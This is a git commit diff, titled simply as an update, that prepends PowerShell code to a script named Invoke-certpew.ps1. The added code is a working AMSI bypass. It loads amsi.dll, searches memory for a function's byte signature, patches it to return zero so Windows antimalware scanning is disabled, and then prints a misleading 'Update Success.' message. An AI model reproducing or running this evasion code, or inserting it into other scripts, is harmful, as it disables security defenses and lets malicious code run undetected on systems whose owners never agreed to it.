a843155b0faffbbf2d59f51e0ce6d17d4d10b1ad
inkz1337 <113606031+inkz1337@users.noreply.github.com>
2022-12-21 14:07:47 +0100

    Update Invoke-certpew.ps1

--- Invoke-certpew.ps1
+++ Invoke-certpew.ps1
@@ -1,3 +1,72 @@
+sleep 7
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string lpLibFileName);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Kernel32
+
+Class Lovac {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$jaje) {
+        while ($true) {
+            [int]$count = 0
+
+            while ($true) {
+                [IntPtr]$address = [IntPtr]::Add($address, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $jaje.Get($count)) {
+                    $count++
+                    If ($count -eq $jaje.Length) {
+                        return [IntPtr]::Subtract($address, $jaje.Length - 1)
+                    }
+                } Else { break }
+            }
+        }
+
+        return $address
+    }
+}
+
+[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+
+[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
+
+If ([IntPtr]::Size -eq 8) {
+    [byte[]]$jaje = [byte[]] (
+        0x4C, 0x8B, 0xDC,      
+        0x49, 0x89, 0x5B, 0x08,
+        0x49, 0x89, 0x6B, 0x10, 
+        0x49, 0x89, 0x73, 0x18, 
+        0x57,                   
+        0x41, 0x56,              
+        0x41, 0x57,             
+        0x48, 0x83, 0xEC, 0x70 
+    )
+} 
+[IntPtr]$taddr = [Lovac]::FindAddress($dllCanUnloadNowAddress, $jaje)
+$oldProtectionBuffer = 0
+[Kernel32]::VirtualProtect($taddr, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+
+$patch = [byte[]] (
+    0x31, 0xC0,
+    0xC3           
+)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $taddr, 3)
+
+$a = 0
+[Kernel32]::VirtualProtect($taddr, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+Write-host "Update Success."
+
 
 function Invoke-certpew
 
